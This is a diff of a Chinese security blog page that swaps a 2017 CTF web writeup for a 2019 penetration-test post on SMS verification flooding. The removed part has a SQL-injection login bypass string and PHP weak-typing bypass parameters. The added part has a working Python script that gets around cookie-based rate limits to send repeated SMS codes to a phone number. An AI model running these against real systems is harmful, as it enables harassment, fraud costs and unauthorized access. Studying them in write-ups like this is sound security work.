@@ -6,31 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://doggy-test.github.io">
-  <title>iscc几道web的writeup | Doggy的博客</title>
+  <title>短信验证码问题（三） | Doggy的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="iscc几道web的writeup  web100 WelcomeToMySQL 点进链接是个上传界面，测了下是黑名单策略，可以上传php5文件，但php的几个函数也收到了限制 源代码有条提示(base.php里用户名和密码):那个看下base.php">
-<meta name="keywords" content="writeup">
+  <meta name="description" content="碰巧又遇到1个，记录一下  一个没有图形验证码的页面，猜猜也知道存在短信轰炸的问题">
+<meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="iscc几道web的writeup">
-<meta property="og:url" content="https://doggy-test.github.io/2017/05/26/iscc几道web的writeup/index.html">
+<meta property="og:title" content="短信验证码问题（三）">
+<meta property="og:url" content="https://doggy-test.github.io/2019/08/28/短信验证码问题（三）/index.html">
 <meta property="og:site_name" content="Doggy的博客">
-<meta property="og:description" content="iscc几道web的writeup  web100 WelcomeToMySQL 点进链接是个上传界面，测了下是黑名单策略，可以上传php5文件，但php的几个函数也收到了限制 源代码有条提示(base.php里用户名和密码):那个看下base.php">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web1.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web2.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web3.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web4.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web5.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web6.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web7.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web8.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web9.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web10.png">
-<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web11.png">
-<meta property="og:updated_time" content="2019-07-17T07:57:19.991Z">
+<meta property="og:description" content="碰巧又遇到1个，记录一下  一个没有图形验证码的页面，猜猜也知道存在短信轰炸的问题">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/1.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/2.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/3.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/4.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/6.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/7.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/8.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/9.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/10.png">
+<meta property="og:updated_time" content="2019-08-28T08:06:30.004Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="iscc几道web的writeup">
-<meta name="twitter:description" content="iscc几道web的writeup  web100 WelcomeToMySQL 点进链接是个上传界面，测了下是黑名单策略，可以上传php5文件，但php的几个函数也收到了限制 源代码有条提示(base.php里用户名和密码):那个看下base.php">
-<meta name="twitter:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web1.png">
+<meta name="twitter:title" content="短信验证码问题（三）">
+<meta name="twitter:description" content="碰巧又遇到1个，记录一下  一个没有图形验证码的页面，猜猜也知道存在短信轰炸的问题">
+<meta name="twitter:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Doggy的博客" type="application/atom+xml">
   
@@ -158,20 +156,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-iscc几道web的writeup" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-短信验证码问题（三）" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      iscc几道web的writeup
+      短信验证码问题（三）
     </h1>
   
 
         
-        <a href="/2017/05/26/iscc几道web的writeup/" class="archive-article-date">
-  	<time datetime="2017-05-26T14:49:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-26</time>
+        <a href="/2019/08/28/短信验证码问题（三）/" class="archive-article-date">
+  	<time datetime="2019-08-28T08:04:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-28</time>
 </a>
         
       </header>
@@ -179,24 +177,31 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>iscc几道web的writeup</p>
+<p>碰巧又遇到1个，记录一下</p>
 </blockquote>
-<p><strong>web100 WelcomeToMySQL</strong></p>
-<p>点进链接是个上传界面，测了下是黑名单策略，可以上传php5文件，但php的几个函数也收到了限制</p>
-<p>源代码有条提示(base.php里用户名和密码):<br>那个看下base.php<br><a id="more"></a><br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web1.png" alt="image"><br>上传成功后访问:<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web2.png" alt="image"><br>猜测是php访问mysql，于是上传:<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web3.png" alt="image"><br>最后访问下得到flag:<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web4.png" alt="image"></p>
-<p><strong>web150 我们一起来日站</strong></p>
-<p>先用扫描器扫到了一个robots.txt，查看了下<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web5.png" alt="image"><br>访问后是这样子的<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web6.png" alt="image"><br>那就继续扫，扫到了管理页面，密码填写’的时候报错了<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web7.png" alt="image"><br>猜测存在注入,所以密码填写’or’=’or’即可</p>
-<p>成功得到flag<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web8.png" alt="image"><br>**web150 </p>
-<p>去年暑假的时候做过，貌似是原题,复制下当时记得好了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">        $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">        $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $v2=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">    <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">        eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>考到的php弱类型的一系列知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL;</div><div class="line">    if(@$a[&quot;bar1&quot;])&#123;</div><div class="line">        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<p>这里判断bar1是否是数字，如果是就die掉，不是下面又会比较。所以可以传递一个bar1=”2017a”即可<br>2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">if(is_array(@$a[&quot;bar2&quot;]))&#123;</div><div class="line">        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;);</div><div class="line">        $pos = array_search(&quot;nudt&quot;, $a[&quot;bar2&quot;]);</div><div class="line">        $pos===false?die(&quot;nope&quot;):NULL;</div><div class="line">        foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123;</div><div class="line">            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;</div><div class="line">        &#125;</div><div class="line">        $v2=1;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<p>先判断bar2是否是数组，是进入下一步–&gt;判断数组元素个数是否为5并且第一个要是数组，进入下一步–&gt;判断a2数组是否存在nupt并且bar2的每一个元素值都不等于nudt–&gt;array_search 会使用’nudt’和array中的每个值作比较，而且intval(‘nudt’)==0,所以只要构造一个0就行,<br>可以传bar2=[[“nut”],1,1,1,0]<br>3.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(@$c[1])&#123;</div><div class="line">    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123;</div><div class="line">        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL;</div><div class="line">        strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>判断c[1]是否存在–&gt;strcmp($c[1],$d)要为0[这里可以传递一个数组]–&gt;c[1]!==$d[同样满足]–&gt;<br>eregi(“3|1|c”,$d.$c[0])[eregi在遇到%00时停止]–&gt; strpos(($c[0].$d), “htctf2016”)[要求满足$c[0].$d=htctf2016]<br>所以可以传cat[]=%00htctf2016&amp;cat[]=1&amp;dog[]=1</p>
-<p>最后截下这次的flag<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web9.png" alt="image"></p>
-<p><strong>web100 flag change flag</strong></p>
-<p>虽说是签到题，做的还是有点迷。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;title&gt;flag change flag!&lt;/title&gt;</div><div class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;&lt;h1&gt;You give me f1ag and I will give you flag too~~~&lt;/h1&gt;&lt;/center&gt;</div><div class="line">&lt;/br&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;form name=&quot;flag&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;</div><div class="line">	&lt;input type=&quot;hidden&quot; name=&quot;hiddenflag&quot; value=&quot;&quot;&gt;</div><div class="line">	&lt;input type=&quot;text&quot; name=&quot;flag&quot; value=&quot;Let&apos;s change flag&quot;&gt;</div><div class="line">	&lt;/br&gt;</div><div class="line">	&lt;input type=&quot;submit&quot; value=&quot;换FLAG!&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
-<p>先发个f1ag过去，提示<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web10.png" alt="image"><br>提示不够，看到有个hiddenflag标签，再写下<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/iscc_web11.png" alt="image"><br>最后通过尝试，加了个FLAG=f1ag得到flag,纯靠运气，没意义的题目。</p>
-<p>剩下的几道没做出来，看下writeup好了<br><a href="http://bobao.360.cn/ctf/detail/199.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/199.html</a></p>
+<p>一个没有图形验证码的页面，猜猜也知道存在短信轰炸的问题</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/1.png" alt="image"></p>
+<a id="more"></a>
+<p>抓个包看一看</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/2.png" alt="image"></p>
+<p>只有手机号，多次请求下看看</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/3.png" alt="image"></p>
+<p>看样子做了点限制，不过还是可能存在遍历手机号发送短信验证码的问题，改下手机号试试</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/4.png" alt="image"></p>
+<p>看样子不是，当我更改了cookie时发现返回包提示:</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/6.png" alt="image"></p>
+<p>那么是不是通过cookie进行了限制？</p>
+<p>因为我是未登录状态，是不是代表着我每第一次请求在浏览器看来都是陌生人，需要set-cookie呢？如果每次请求都有新的cookie，是不是代表着我可以利用这样的cookie绕过限制进行短信轰炸？</p>
+<p>python简单写了个访问请求，发现header里没有cookie字段</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/7.png" alt="image"></p>
+<p>当我清空浏览器缓存时再次请求，发现依旧没有：</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/8.png" alt="image"></p>
+<p>仔细查看页面请求内容时，在ajax请求里发现这样一条记录：</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/9.png" alt="image"></p>
+<p>应该就是它了，写个python脚本试下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span> :</div><div class="line">    requrl = <span class="string">"https://xxx.com/sendMessage.do"</span></div><div class="line">    Cookies = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        requrl2 = <span class="string">"https://xxx.com/getSessionLogin.do"</span></div><div class="line">        headers = &#123;</div><div class="line">            <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36"</span>,</div><div class="line">        &#125;</div><div class="line">        data = &#123;</div><div class="line">            <span class="string">"tranCode"</span>:<span class="string">"null"</span>,</div><div class="line">            <span class="string">"EMP_SID"</span>:<span class="string">""</span>,</div><div class="line">            <span class="string">"responseFormat"</span>:<span class="string">"JSON"</span></div><div class="line">        &#125;</div><div class="line">        _cookie = requests.post(url=requrl2,data=data,headers=headers).headers[<span class="string">"Set-Cookie"</span>].split(<span class="string">"Path=/"</span>)[<span class="number">0</span>]</div><div class="line">        Cookies.append(_cookie)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        headers =&#123;</div><div class="line">            <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36"</span>,</div><div class="line">            <span class="string">"Cookie"</span>:Cookies[i]</div><div class="line">        &#125;</div><div class="line">        data = &#123;</div><div class="line">            <span class="string">"currentBusinessCode"</span>: <span class="string">"10000040"</span>,</div><div class="line">            <span class="string">"tokenSync_rootBranchId"</span>: <span class="string">"15601"</span>,</div><div class="line">            <span class="string">"phoneNo"</span>: <span class="string">"xxxx"</span>,</div><div class="line">            <span class="string">"messageContent"</span>: <span class="string">"0014"</span>,</div><div class="line">            <span class="string">"EMP_SID"</span>: <span class="string">"1"</span>,</div><div class="line">            <span class="string">"responseFormat"</span>: <span class="string">"JSON"</span>,</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        r = requests.post(url=requrl,data=data,headers=headers)</div><div class="line">        <span class="keyword">print</span> r.text</div></pre></td></tr></table></figure>
+<p>成功</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/sms/10.png" alt="image"></p>
 
       
 
@@ -231,7 +236,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -243,7 +248,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/CTF/" class="article-tag-list-link color4">CTF</a>
+        			<a href="/categories/渗透测试/" class="article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -298,7 +303,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://doggy-test.github.io/2017/05/26/iscc几道web的writeup/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://doggy-test.github.io/2019/08/28/短信验证码问题（三）/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -312,18 +317,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/06/02/某次渗透/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          某次渗透
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/05/11/web安全知识补充-二/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">web安全知识补充(二)</div>
+    <a href="/2019/07/26/遍历手机号发送验证码-二/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">遍历手机号发送验证码(二)</div>
       <i class="icon-circle-right"></i>
     </a>
   
